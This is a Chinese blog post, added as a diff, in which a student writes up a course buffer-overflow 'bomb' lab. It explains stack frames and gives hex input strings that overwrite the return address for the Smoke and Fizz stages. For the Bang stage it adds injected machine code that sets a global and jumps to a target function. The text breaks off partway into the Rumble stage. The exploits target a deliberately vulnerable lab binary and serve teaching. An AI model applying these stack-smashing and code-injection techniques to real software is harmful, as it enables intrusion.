@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.loli.net/css?family=Noto Sans SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Fira:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本篇记录缓冲区溢出炸弹实验的求解过程. 大体感想 这次的缓冲区溢出实验, 相比之前的二进制炸弹拆解显得容易一些, 可能是直接攻击思维上比较好理解吧, 毕竟上次还得真的用gdb不断地反汇编来了解炸弹的真实意图, 而这次直球攻击就行了. 不过, 想要攻击得手还是得先了解一下堆栈结构. 先抄书.  在C语言程序执行过程中, 当前正在执行的过程(即函数)在栈中回形成本过程的栈帧. 一个过程的栈帧中除了保存">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓冲区炸弹">
+<meta property="og:url" content="http://example.com/2021/11/07/%E7%88%AC%E8%A1%8C%E5%8F%B2/bufferbomb1/index.html">
+<meta property="og:site_name" content="这是什么地方">
+<meta property="og:description" content="本篇记录缓冲区溢出炸弹实验的求解过程. 大体感想 这次的缓冲区溢出实验, 相比之前的二进制炸弹拆解显得容易一些, 可能是直接攻击思维上比较好理解吧, 毕竟上次还得真的用gdb不断地反汇编来了解炸弹的真实意图, 而这次直球攻击就行了. 不过, 想要攻击得手还是得先了解一下堆栈结构. 先抄书.  在C语言程序执行过程中, 当前正在执行的过程(即函数)在栈中回形成本过程的栈帧. 一个过程的栈帧中除了保存">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-11-06T16:12:04.000Z">
+<meta property="article:modified_time" content="2022-05-21T20:38:05.000Z">
+<meta property="article:author" content="Ushio">
+<meta property="article:tag" content="私人">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/11/07/%E7%88%AC%E8%A1%8C%E5%8F%B2/bufferbomb1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>缓冲区炸弹 | 这是什么地方</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">这是什么地方</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">乱七八糟的文章都丢这里了</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/07/%E7%88%AC%E8%A1%8C%E5%8F%B2/bufferbomb1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/roll.jpg">
+      <meta itemprop="name" content="Ushio">
+      <meta itemprop="description" content="吐黑泥的地方🤗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="这是什么地方">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          缓冲区炸弹
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-07 00:12:04" itemprop="dateCreated datePublished" datetime="2021-11-07T00:12:04+08:00">2021-11-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-22 04:38:05" itemprop="dateModified" datetime="2022-05-22T04:38:05+08:00">2022-05-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%88%AC%E8%A1%8C%E5%8F%B2/" itemprop="url" rel="index"><span itemprop="name">爬行史</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本篇记录缓冲区溢出炸弹实验的求解过程.</p>
+<h1 id="大体感想">大体感想</h1>
+<p>这次的缓冲区溢出实验, 相比之前的二进制炸弹拆解显得容易一些,
+可能是直接攻击思维上比较好理解吧,
+毕竟上次还得真的用<code>gdb</code>不断地反汇编来了解炸弹的真实意图,
+而这次直球攻击就行了. 不过, 想要攻击得手还是得先了解一下堆栈结构.<br>
+先抄书.</p>
+<blockquote>
+<p>在<code>C</code>语言程序执行过程中,
+当前正在执行的过程(即函数)在栈中回形成本过程的栈帧.
+一个过程的栈帧中除了保存<code>EBP</code>和被调用者保存寄存器的值外,
+还会保存本过程的非静态局部变量和过程调用的返回地址.
+如果在非静态局部变量中定义了数组变量, 那么,
+有可能在对数组元素访问时发生超越数组存储区的越界访问.
+通常把这种数组存储区看成是一个缓冲区,
+这种超越数组存储区范围的访问称为<strong>缓冲区溢出</strong>.</p>
+</blockquote>
+<p>简单来说, 因为代码和数据混合放置,
+在内存中开辟的缓冲区事实上会和代码挨在一起. 如果没有溢出,
+当然不会有任何危险, 但是如果不加确认的直接写入缓冲区而且还发生了溢出,
+就会覆盖原有的代码, 数据, 以致程序发生不可预料的行为.
+如果恶意攻击者利用这一点, 就可以达到攻击的目的.</p>
+<h2 id="另一个重要的常识"><del>另一个重要的常识</del></h2>
+<p>在<code>i386</code>机器中, 栈从高地址向低地址增长. 虽然这个是常识,
+但是我总是记不住.</p>
+<p>那么, 接下来就记录一下解题的过程吧.</p>
+<h2 id="smoke">Smoke</h2>
+<p><strong>Smoke</strong>是本次实验的第一个阶段.
+它要求你利用缓冲区溢出使得程序跳转到<strong>Smoke</strong>.
+这个比较容易. 主函数会调用<code>test</code>过程, 调用之前,
+会将返回地址压入栈中, 接下来, 又将<code>ebp</code>压入栈中,
+然后将<code>esp</code>的值赋给<code>ebp</code>. 梳理一下这个过程.
+首先将返回地址压入栈中,
+接着又将<code>ebp</code>压入栈中,稍作思考可以发现 ,此时,
+返回地址在栈里面就处于<code>&amp;ebp + 4</code>的位置,
+这是因为栈从高地址向低地址增长, 而<code>ebp</code>入栈较晚.
+接下来一步更是重量级, 它等价于<code>ebp = &amp;ebp</code>, 这样,
+栈里面<code>ebp</code>原来的值的地址就得到了,
+我们就可以通过它来确定返回值的位置了. 那么, 如果知道缓冲区的大小,
+我们就可以通过让缓冲区溢出的方式覆盖返回值, 使得程序想跳到哪,
+就跳到哪.</p>
+<p>动手.
+首先输入<code>objdump -d bufbomb &gt; bufbomb.txt</code>保存下反汇编结果(傻吊老师喜欢<code>txt</code>后缀我就满足他),
+然后在其中查看缓冲区的大小.<br>
+<code>objdump</code>出来的部分代码如下.</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049c77 &lt;getbuf&gt;:</span><br><span class="line"> 8049c77:    <span class="number">55</span>                       <span class="keyword">push</span>   %ebp</span><br><span class="line"> 8049c78:    <span class="number">89</span> e5                    <span class="keyword">mov</span>    %esp,%ebp</span><br><span class="line"> 8049c7a:    <span class="number">83</span> ec <span class="number">48</span>                 <span class="keyword">sub</span>    <span class="number">$0</span>x48,%esp</span><br><span class="line"> 8049c7d:    <span class="number">83</span> ec 0c                 <span class="keyword">sub</span>    <span class="number">$0</span>xc,%esp</span><br><span class="line"> 8049c80:    <span class="number">8d</span> <span class="number">45</span> bc                 <span class="keyword">lea</span>    -<span class="number">0x44</span>(%ebp),%eax</span><br><span class="line"> 8049c83:    <span class="number">50</span>                       <span class="keyword">push</span>   %eax</span><br><span class="line"> 8049c84:    e8 b9 fa ff ff           <span class="keyword">call</span>   <span class="number">8049742</span> &lt;Gets&gt;</span><br><span class="line"> 8049c89:    <span class="number">83</span> c4 <span class="number">10</span>                 <span class="keyword">add</span>    <span class="number">$0</span>x10,%esp</span><br><span class="line"> 8049c8c:    b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"> 8049c91:    c9                       <span class="keyword">leave</span>  </span><br><span class="line"> 8049c92:    c3                       <span class="keyword">ret</span>   </span><br></pre></td></tr></table></figure>
+<p>我们的目标是在这段代码里造成缓冲区溢出,
+使之调用<code>Gets</code>之后跳转到<code>smoke</code>函数. 这并不难,
+因为可以看到,
+<code>lea -0x44(%ebp), %eax</code>这一句暴露了它在栈里面开了个<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.557ex" role="img" focusable="false" viewBox="0 -666 1000 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container></span>字节的缓冲区,
+因此只需要填入68个字节的随便什么玩意,
+然后接下来的位置就是栈内<code>ebp</code>的原值, 这里甚至都不需要管它,
+继续随便写点什么<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.532ex" role="img" focusable="false" viewBox="0 -677 500 677"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container></span>字节的东西覆盖掉它, 接下来的<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.532ex" role="img" focusable="false" viewBox="0 -677 500 677"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container></span>个字节是返回值,
+此处填入我想要的返回值即可, 注意填入方式应当是小端.</p>
+<p>因此, 写下如下的代码并作为程序的输入, 即可完成进攻.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  04 94 04 08</span><br></pre></td></tr></table></figure>
+<p>这样一来, <code>Gets</code>将永远不会再回来,
+而是跳转到<code>Smoke</code>函数去执行别的过程了.</p>
+<p>第一阶段<strong>Smoke</strong>结束.</p>
+<h2 id="fizz">Fizz</h2>
+<p>这一关和上一关做法基本类似, 只需要注意到在汇编代码中, 有这么几句</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8049437</span>:   8b <span class="number">55</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="number">0x8</span>(%ebp),%edx</span><br><span class="line">804943a:   a1 e0 d2 <span class="number">04</span> <span class="number">08</span>          <span class="keyword">mov</span>    <span class="number">0x804d2e0</span>,%eax</span><br><span class="line">804943f:   <span class="number">39</span> c2                   <span class="keyword">cmp</span>    %eax,%edx</span><br></pre></td></tr></table></figure>
+<p>即可知晓这一题的做法. 首先还是得跳转到<code>fizz</code>函数,
+这一点和<strong>smoke</strong>并没有什么不同,
+即让缓冲区溢出并恰好覆盖返回值, 接下来,
+因为函数参数存放的位置是<code>$ebp+8</code>,
+掰掰手指可以知道它在刚刚覆盖的返回值的后<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.532ex" role="img" focusable="false" viewBox="0 -677 500 677"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container></span>个字节处, 则再写<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.532ex" role="img" focusable="false" viewBox="0 -677 500 677"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container></span>个0,
+然后按照小端法填入cookie即可解决掉这一题. 本题的过关代码如下.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  00 00 00 00</span><br><span class="line">00 00 00 00  31 94 04 08</span><br><span class="line">00 00 00 00  1f 63 15 41</span><br></pre></td></tr></table></figure>
+<h2 id="bang">Bang</h2>
+<p>这个题的要求比较高一点,
+因为它要求向缓冲区写入恶意代码并执行这些代码来达到攻击目的.
+<del>虽然这题确实有偷鸡做法不需要这么做但是当我知道的时候我已经把整个实验全部写完了😡</del></p>
+<p>考虑如何达到这个目的. 首先考虑从什么地方开始攻击这个程序.
+唯一能够写入的地方是缓冲区, 因此只能从这个方面入手. 进一步考虑,
+向缓冲区内写入恶意代码之后, 该如何执行这些代码呢?
+因为这台机器是顺序地执行代码的,
+必须想一个办法让它跳转到缓冲区开头执行才好. 为了达到这个目的,
+可以覆盖返回值地址, 让它返回到缓冲区开头来执行我们写入的恶意代码.
+这几乎是唯一的选择, 因为写入这些恶意代码并不能马上见效,
+我们的缓冲区在机器中可能和实际执行的代码相距甚远,
+机器仍然会按照它自己的步调继续往下执行直到遇到<code>ret</code>指令,
+发生一个跳转, 而这正是我们有机可乘的地方.</p>
+<p>这样, 就能确定一套完整的流程 :
+<code>覆盖返回值 -&gt; 跳转到缓冲区开头 -&gt; 执行恶意代码</code>.</p>
+<p>为了做到这件事, 首先写入足量的0来恰好填塞缓冲区以及覆盖返回值.
+接下来, 生成我们需要的恶意代码,
+然后从开头替换掉刚刚写下的那么多0既可.</p>
+<p>然后考虑如何编写恶意代码. 跳转到<code>bang</code>是容易的,
+因为我们只需要这么写:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> $(bang<span class="string">'s address DA⭐ZE)</span></span><br><span class="line"><span class="string">ret</span></span><br></pre></td></tr></table></figure>
+<p>就能达到目的. 稍微麻烦的点在于设置全局变量的值.
+我们需要知道全局变量的地址, 这才能将它设置为需要的cookie.
+为了做到这一点, 可以查看反汇编的结果, 找到比较的那部分代码即可.
+反汇编结果中的这一段显示了我们需要的结果.</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8049488</span>:   a1 e8 d2 <span class="number">04</span> <span class="number">08</span>          <span class="keyword">mov</span>    <span class="number">0x804d2e8</span>,%eax <span class="comment">;key point!</span></span><br><span class="line"><span class="number">804948d</span>:   <span class="number">89</span> c2                   <span class="keyword">mov</span>    %eax,%edx</span><br><span class="line">804948f:   a1 e0 d2 <span class="number">04</span> <span class="number">08</span>          <span class="keyword">mov</span>    <span class="number">0x804d2e0</span>,%eax  <span class="comment">;key point!</span></span><br><span class="line"><span class="number">8049494</span>:   <span class="number">39</span> c2                   <span class="keyword">cmp</span>    %eax,%edx</span><br><span class="line"><span class="number">8049496</span>:   <span class="number">75</span> <span class="number">25</span>                   <span class="keyword">jne</span>    80494bd &lt;bang+<span class="number">0x3b</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>注意到此处对两个地址指向的东西进行了比较,
+但是我们并不知道哪个是全局变量, 因此可以在<code>gdb</code>里面设置断点,
+当运行到这一步时, 打印这两个地址对应的字符串的值即可. 经过这一个操作,
+得到<code>0x804d2e0</code>是需要填入的全局变量. 因此,
+在恶意代码中再增加如下一句.</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movl <span class="number">$0</span>x4115631f, <span class="number">0x804d2e8</span></span><br></pre></td></tr></table></figure>
+<p>这就设置了全局变量的值.</p>
+<p>运行之后, 攻击成功.</p>
+<p>这个阶段的过关代码为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c7 05 e8 d2 04 08 1f</span><br><span class="line">63 15 41</span><br><span class="line">68 82 94 04 08</span><br><span class="line">c3 /* 16 bytes of good code */</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">4c b5 68 55</span><br></pre></td></tr></table></figure>
+<h2 id="rumble">Rumble</h2>
+<p>实验从这个阶段开始变得有点难度了.</p>
+<p>考察这个<code>rumble</code>函数,
+它在它的内部调用了另一个函数<code>eval2equal</code>函数,
+从名字其实也可以看出这个函数会将输入<strong>eval</strong>一下,
+而不是简单的比较. 因为仅看<code>rumble</code>并不能知道怎么攻击,
+因此进一步考察<code>eval2equal</code>函数.
+此函数前面的部分用于产生随机数, <del>讲义提示我们</del>不需要注意,
+而后面调用了一个<code>sprintf</code>函数.
+通过观察代码容易发现这个函数接受输入的字符串和一个格式串,
+并给一个数字赋值, 而且后面还拿这个数字来和输入的<code>cookie</code>比较,
+因此可以断定此函数用于解析输入的字符串.
+因此使用<code>gdb</code>打印格式串, 发现此格式串为<code>%.8X</code>,
